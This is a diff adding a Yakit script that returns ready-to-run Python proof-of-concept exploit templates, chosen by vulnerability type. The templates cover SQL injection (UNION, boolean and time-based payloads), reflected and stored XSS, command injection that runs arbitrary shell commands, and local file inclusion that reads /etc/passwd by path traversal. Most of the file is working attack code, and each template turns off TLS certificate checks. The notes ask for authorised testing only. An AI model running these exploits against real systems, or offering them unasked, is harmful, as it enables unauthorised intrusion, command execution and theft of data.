@@ -1,0 +1,647 @@
+__DESC__ = "POC模板搜索工具，根据漏洞类型和攻击向量搜索和提供相应的Python POC模板，为POC生成提供代码框架参考。"
+__VERBOSE_NAME__ = "POC模板搜索工具"
+__KEYWORDS__ = "POC模板,漏洞利用模板,Python POC,代码模板,攻击向量,漏洞利用框架,安全测试模板"
+
+yakit.AutoInitYakit()
+
+vuln_type := cli.String("vuln_type", cli.setHelp("漏洞类型，如sqli、xss、rce等"), cli.setRequired(true))
+attack_vector := cli.String("attack_vector", cli.setHelp("攻击向量描述"))
+language := cli.String("language", cli.setHelp("目标应用编程语言"), cli.setDefault(""))
+include_examples := cli.Bool("include_examples", cli.setHelp("是否包含使用示例"), cli.setDefault(true))
+
+cli.check()
+
+vulnType := str.ToLower(vuln_type)
+attackVector := str.ToLower(attack_vector)
+targetLanguage := str.ToLower(language)
+
+// POC模板库
+templates := make(map[string]any)
+
+// SQL注入POC模板
+if str.Contains(vulnType, "sqli") || str.Contains(vulnType, "sql") {
+    sqlTemplate := `#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+SQL注入漏洞POC
+目标: {target_description}
+"""
+
+import requests
+import sys
+import time
+import urllib.parse
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+# 禁用SSL警告
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+class SQLInjectionPOC:
+    def __init__(self, target_url, timeout=10):
+        self.target_url = target_url
+        self.timeout = timeout
+        self.session = requests.Session()
+        self.session.verify = False
+
+    def check_vulnerability(self):
+        """检测SQL注入漏洞"""
+        payloads = [
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' OR '1'='1' #",
+            "' UNION SELECT NULL--",
+            "' AND SLEEP(5)--",
+        ]
+
+        for payload in payloads:
+            try:
+                # 构造请求参数
+                params = {
+                    "id": payload,  # 根据实际参数名调整
+                }
+
+                start_time = time.time()
+                response = self.session.get(
+                    self.target_url,
+                    params=params,
+                    timeout=self.timeout
+                )
+                end_time = time.time()
+
+                # 检测响应时间（时间盲注）
+                if end_time - start_time > 4:
+                    return True, f"时间盲注检测成功: {payload}"
+
+                # 检测错误信息
+                error_patterns = [
+                    "mysql", "sql", "syntax error", "ora-", "postgresql",
+                    "sqlite", "mssql", "odbc", "jdbc"
+                ]
+
+                response_text = response.text.lower()
+                for pattern in error_patterns:
+                    if pattern in response_text:
+                        return True, f"错误信息检测成功: {payload}"
+
+            except Exception as e:
+                print(f"请求异常: {e}")
+                continue
+
+        return False, "未检测到SQL注入漏洞"
+
+    def exploit(self):
+        """利用SQL注入获取数据"""
+        # 这里添加具体的利用代码
+        print("开始利用SQL注入漏洞...")
+
+        # 示例：获取数据库版本
+        version_payload = "' UNION SELECT version()--"
+        try:
+            params = {"id": version_payload}
+            response = self.session.get(self.target_url, params=params)
+            print(f"数据库版本信息: {response.text}")
+        except Exception as e:
+            print(f"利用失败: {e}")
+
+def main():
+    if len(sys.argv) != 2:
+        print("使用方法: python3 poc.py <target_url>")
+        print("示例: python3 poc.py http://example.com/vulnerable.php")
+        sys.exit(1)
+
+    target_url = sys.argv[1]
+    print(f"目标URL: {target_url}")
+    print("=" * 50)
+
+    poc = SQLInjectionPOC(target_url)
+
+    # 检测漏洞
+    is_vulnerable, message = poc.check_vulnerability()
+    print(f"漏洞检测结果: {message}")
+
+    if is_vulnerable:
+        # 利用漏洞
+        poc.exploit()
+    else:
+        print("目标不存在SQL注入漏洞")
+
+if __name__ == "__main__":
+    main()`
+
+    templates["sqli"] = map[string]any{
+        "template": sqlTemplate,
+        "description": "SQL注入漏洞POC模板，支持错误注入、时间盲注检测和数据提取",
+        "parameters": []string{"target_url", "vulnerable_parameter"},
+        "dependencies": []string{"requests"},
+    }
+}
+
+// XSS POC模板
+if str.Contains(vulnType, "xss") {
+    xssTemplate := `#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+XSS漏洞POC
+目标: {target_description}
+"""
+
+import requests
+import sys
+import urllib.parse
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+class XSSPoc:
+    def __init__(self, target_url, timeout=10):
+        self.target_url = target_url
+        self.timeout = timeout
+        self.session = requests.Session()
+        self.session.verify = False
+
+    def check_reflected_xss(self):
+        """检测反射型XSS"""
+        payloads = [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<iframe src=javascript:alert('XSS')>",
+        ]
+
+        for payload in payloads:
+            try:
+                params = {
+                    "search": payload,  # 根据实际参数名调整
+                    "q": payload,
+                    "keyword": payload,
+                }
+
+                response = self.session.get(
+                    self.target_url,
+                    params=params,
+                    timeout=self.timeout
+                )
+
+                # 检查payload是否在响应中
+                if payload in response.text:
+                    return True, f"反射型XSS检测成功: {payload}"
+
+            except Exception as e:
+                print(f"请求异常: {e}")
+                continue
+
+        return False, "未检测到反射型XSS漏洞"
+
+    def check_stored_xss(self):
+        """检测存储型XSS"""
+        payload = "<script>alert('Stored_XSS')</script>"
+
+        try:
+            # 提交恶意数据
+            data = {
+                "comment": payload,
+                "content": payload,
+                "message": payload,
+            }
+
+            post_response = self.session.post(
+                self.target_url,
+                data=data,
+                timeout=self.timeout
+            )
+
+            # 检查是否存储成功
+            get_response = self.session.get(self.target_url, timeout=self.timeout)
+
+            if payload in get_response.text:
+                return True, "存储型XSS检测成功"
+
+        except Exception as e:
+            print(f"存储型XSS检测异常: {e}")
+
+        return False, "未检测到存储型XSS漏洞"
+
+def main():
+    if len(sys.argv) != 2:
+        print("使用方法: python3 poc.py <target_url>")
+        print("示例: python3 poc.py http://example.com/search.php")
+        sys.exit(1)
+
+    target_url = sys.argv[1]
+    print(f"目标URL: {target_url}")
+    print("=" * 50)
+
+    poc = XSSPoc(target_url)
+
+    # 检测反射型XSS
+    is_reflected, reflected_msg = poc.check_reflected_xss()
+    print(f"反射型XSS: {reflected_msg}")
+
+    # 检测存储型XSS
+    is_stored, stored_msg = poc.check_stored_xss()
+    print(f"存储型XSS: {stored_msg}")
+
+    if is_reflected or is_stored:
+        print("发现XSS漏洞！")
+    else:
+        print("未发现XSS漏洞")
+
+if __name__ == "__main__":
+    main()`
+
+    templates["xss"] = map[string]any{
+        "template": xssTemplate,
+        "description": "XSS漏洞POC模板，支持反射型和存储型XSS检测",
+        "parameters": []string{"target_url", "vulnerable_parameter"},
+        "dependencies": []string{"requests"},
+    }
+}
+
+// RCE POC模板
+if str.Contains(vulnType, "rce") || str.Contains(vulnType, "command") {
+    rceTemplate := `#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+远程代码执行(RCE)漏洞POC
+目标: {target_description}
+"""
+
+import requests
+import sys
+import time
+import base64
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+class RCEPoc:
+    def __init__(self, target_url, timeout=10):
+        self.target_url = target_url
+        self.timeout = timeout
+        self.session = requests.Session()
+        self.session.verify = False
+
+    def check_command_injection(self):
+        """检测命令注入"""
+        # 生成唯一标识符
+        marker = str(int(time.time()))
+
+        payloads = [
+            f"; echo {marker}",
+            f"| echo {marker}",
+            f"& echo {marker}",
+            f"$(echo {marker})",
+            f"; ping -c 1 127.0.0.1 && echo {marker}",
+        ]
+
+        for payload in payloads:
+            try:
+                params = {
+                    "cmd": payload,
+                    "command": payload,
+                    "exec": payload,
+                }
+
+                response = self.session.get(
+                    self.target_url,
+                    params=params,
+                    timeout=self.timeout
+                )
+
+                if marker in response.text:
+                    return True, f"命令注入检测成功: {payload}"
+
+            except Exception as e:
+                print(f"请求异常: {e}")
+                continue
+
+        return False, "未检测到命令注入漏洞"
+
+    def exploit_command(self, command="id"):
+        """利用命令注入执行系统命令"""
+        print(f"尝试执行命令: {command}")
+
+        payloads = [
+            f"; {command}",
+            f"| {command}",
+            f"& {command}",
+            f"$({command})",
+        ]
+
+        for payload in payloads:
+            try:
+                params = {
+                    "cmd": payload,
+                    "command": payload,
+                    "exec": payload,
+                }
+
+                response = self.session.get(
+                    self.target_url,
+                    params=params,
+                    timeout=self.timeout
+                )
+
+                print(f"Payload: {payload}")
+                print(f"Response: {response.text[:500]}")
+                print("-" * 30)
+
+            except Exception as e:
+                print(f"执行失败: {e}")
+
+def main():
+    if len(sys.argv) < 2:
+        print("使用方法: python3 poc.py <target_url> [command]")
+        print("示例: python3 poc.py http://example.com/exec.php id")
+        sys.exit(1)
+
+    target_url = sys.argv[1]
+    command = sys.argv[2] if len(sys.argv) > 2 else "id"
+
+    print(f"目标URL: {target_url}")
+    print(f"执行命令: {command}")
+    print("=" * 50)
+
+    poc = RCEPoc(target_url)
+
+    # 检测漏洞
+    is_vulnerable, message = poc.check_command_injection()
+    print(f"漏洞检测结果: {message}")
+
+    if is_vulnerable:
+        # 利用漏洞
+        poc.exploit_command(command)
+    else:
+        print("目标不存在RCE漏洞")
+
+if __name__ == "__main__":
+    main()`
+
+    templates["rce"] = map[string]any{
+        "template": rceTemplate,
+        "description": "远程代码执行漏洞POC模板，支持命令注入检测和利用",
+        "parameters": []string{"target_url", "command"},
+        "dependencies": []string{"requests"},
+    }
+}
+
+// 文件包含POC模板
+if str.Contains(vulnType, "lfi") || str.Contains(vulnType, "file") {
+    lfiTemplate := `#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+文件包含漏洞POC
+目标: {target_description}
+"""
+
+import requests
+import sys
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+class FileInclusionPOC:
+    def __init__(self, target_url, timeout=10):
+        self.target_url = target_url
+        self.timeout = timeout
+        self.session = requests.Session()
+        self.session.verify = False
+
+    def check_lfi(self):
+        """检测本地文件包含"""
+        payloads = [
+            "/etc/passwd",
+            "../../etc/passwd",
+            "../../../etc/passwd",
+            "../../../../etc/passwd",
+            "/etc/hosts",
+            "/proc/version",
+            "C:\\Windows\\System32\\drivers\\etc\\hosts",
+            "C:\\Windows\\win.ini",
+        ]
+
+        for payload in payloads:
+            try:
+                params = {
+                    "file": payload,
+                    "page": payload,
+                    "include": payload,
+                    "path": payload,
+                }
+
+                response = self.session.get(
+                    self.target_url,
+                    params=params,
+                    timeout=self.timeout
+                )
+
+                # 检查Linux系统文件特征
+                linux_patterns = ["root:x:0:0:", "/bin/bash", "/sbin/nologin"]
+                # 检查Windows系统文件特征
+                windows_patterns = ["[fonts]", "[extensions]", "for 16-bit app support"]
+
+                response_lower = response.text.lower()
+
+                for pattern in linux_patterns + windows_patterns:
+                    if pattern.lower() in response_lower:
+                        return True, f"LFI检测成功: {payload}"
+
+            except Exception as e:
+                print(f"请求异常: {e}")
+                continue
+
+        return False, "未检测到LFI漏洞"
+
+    def exploit_lfi(self, target_file="/etc/passwd"):
+        """利用LFI读取指定文件"""
+        print(f"尝试读取文件: {target_file}")
+
+        payloads = [
+            target_file,
+            f"../{target_file}",
+            f"../../{target_file}",
+            f"../../../{target_file}",
+            f"../../../../{target_file}",
+        ]
+
+        for payload in payloads:
+            try:
+                params = {
+                    "file": payload,
+                    "page": payload,
+                    "include": payload,
+                    "path": payload,
+                }
+
+                response = self.session.get(
+                    self.target_url,
+                    params=params,
+                    timeout=self.timeout
+                )
+
+                print(f"Payload: {payload}")
+                print(f"Response: {response.text[:500]}")
+                print("-" * 30)
+
+            except Exception as e:
+                print(f"读取失败: {e}")
+
+def main():
+    if len(sys.argv) < 2:
+        print("使用方法: python3 poc.py <target_url> [file_path]")
+        print("示例: python3 poc.py http://example.com/include.php /etc/passwd")
+        sys.exit(1)
+
+    target_url = sys.argv[1]
+    target_file = sys.argv[2] if len(sys.argv) > 2 else "/etc/passwd"
+
+    print(f"目标URL: {target_url}")
+    print(f"目标文件: {target_file}")
+    print("=" * 50)
+
+    poc = FileInclusionPOC(target_url)
+
+    # 检测漏洞
+    is_vulnerable, message = poc.check_lfi()
+    print(f"漏洞检测结果: {message}")
+
+    if is_vulnerable:
+        # 利用漏洞
+        poc.exploit_lfi(target_file)
+    else:
+        print("目标不存在LFI漏洞")
+
+if __name__ == "__main__":
+    main()`
+
+    templates["lfi"] = map[string]any{
+        "template": lfiTemplate,
+        "description": "本地文件包含漏洞POC模板，支持文件读取和路径遍历",
+        "parameters": []string{"target_url", "target_file"},
+        "dependencies": []string{"requests"},
+    }
+}
+
+// 通用HTTP请求POC模板
+if len(templates) == 0 {
+    genericTemplate := `#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+通用漏洞POC模板
+目标: {target_description}
+"""
+
+import requests
+import sys
+import json
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+class GenericPOC:
+    def __init__(self, target_url, timeout=10):
+        self.target_url = target_url
+        self.timeout = timeout
+        self.session = requests.Session()
+        self.session.verify = False
+
+    def send_payload(self, payload, method="GET"):
+        """发送测试载荷"""
+        try:
+            if method.upper() == "POST":
+                response = self.session.post(
+                    self.target_url,
+                    data=payload,
+                    timeout=self.timeout
+                )
+            else:
+                response = self.session.get(
+                    self.target_url,
+                    params=payload,
+                    timeout=self.timeout
+                )
+
+            return response
+
+        except Exception as e:
+            print(f"请求异常: {e}")
+            return None
+
+    def analyze_response(self, response):
+        """分析响应内容"""
+        if not response:
+            return False, "无响应"
+
+        print(f"状态码: {response.status_code}")
+        print(f"响应长度: {len(response.text)}")
+        print(f"响应头: {dict(response.headers)}")
+        print(f"响应内容: {response.text[:500]}")
+
+        return True, "请求成功"
+
+def main():
+    if len(sys.argv) != 2:
+        print("使用方法: python3 poc.py <target_url>")
+        print("示例: python3 poc.py http://example.com/api/endpoint")
+        sys.exit(1)
+
+    target_url = sys.argv[1]
+    print(f"目标URL: {target_url}")
+    print("=" * 50)
+
+    poc = GenericPOC(target_url)
+
+    # 发送测试请求
+    test_payload = {"test": "value"}
+    response = poc.send_payload(test_payload)
+
+    # 分析响应
+    success, message = poc.analyze_response(response)
+    print(f"分析结果: {message}")
+
+if __name__ == "__main__":
+    main()`
+
+    templates["generic"] = map[string]any{
+        "template": genericTemplate,
+        "description": "通用漏洞POC模板，适用于各种HTTP请求场景",
+        "parameters": []string{"target_url"},
+        "dependencies": []string{"requests"},
+    }
+}
+
+// 构建结果
+result := make(map[string]any)
+result["vuln_type"] = vulnType
+result["attack_vector"] = attackVector
+result["target_language"] = targetLanguage
+result["templates"] = templates
+
+// 添加使用示例
+if include_examples {
+    examples := make(map[string]any)
+
+    examples["installation"] = "pip3 install requests urllib3"
+    examples["basic_usage"] = "python3 poc.py <target_url>"
+    examples["with_parameters"] = "python3 poc.py <target_url> [additional_params]"
+    examples["notes"] = []string{
+        "请确保在合法授权的环境中使用POC",
+        "POC仅用于安全测试和漏洞验证",
+        "不得用于非法攻击和恶意行为",
+        "建议在测试环境中先验证POC的有效性",
+    }
+
+    result["examples"] = examples
+}
+
+// 添加建议
+recommendations := []string{
+    "根据具体漏洞情况调整POC参数",
+    "添加适当的错误处理和日志记录",
+    "考虑目标应用的认证和授权机制",
+    "遵循负责任的漏洞披露原则",
+}
+result["recommendations"] = recommendations
+
+yakit.Output(json.Marshal(result)~)
